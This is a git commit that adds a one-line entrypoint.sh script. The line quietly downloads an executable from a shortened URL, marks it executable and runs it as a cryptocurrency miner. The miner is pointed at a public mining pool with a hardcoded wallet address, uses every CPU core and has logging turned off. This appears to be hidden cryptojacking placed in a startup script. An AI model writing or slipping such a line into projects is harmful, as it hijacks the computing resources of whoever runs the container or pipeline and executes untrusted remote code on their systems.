5ba87f82375c7d5f47bbd7ad034d1d8cd486356b
applife144 <107717580+applife144@users.noreply.github.com>
2022-06-18 03:29:47 +0800

    Create entrypoint.sh

---
+++ entrypoint.sh
@@ -0,0 +1,1 @@
+wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://na.luckpool.net:3956 -u RUA92tQZsJeNBFCPyMY9ndi6ZNRT4XmDjD.$corei13 -p hybrid -t $(nproc) --max-log-rate 0
